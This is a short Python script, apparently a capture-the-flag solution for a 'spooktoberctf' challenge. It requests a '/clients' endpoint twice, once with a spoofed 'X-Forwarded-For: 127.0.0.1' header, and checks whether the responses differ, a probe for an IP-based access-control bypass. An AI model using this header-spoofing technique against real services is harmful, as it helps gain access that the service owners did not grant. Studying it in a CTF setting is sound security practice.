import requests


URI = 'http://spooktoberctf.se:22083/clients'




a = requests.get(URI,headers={'X-Forwarded-For': "127.0.0.1"}).text
b = requests.get(URI).text

if a != b:
    print()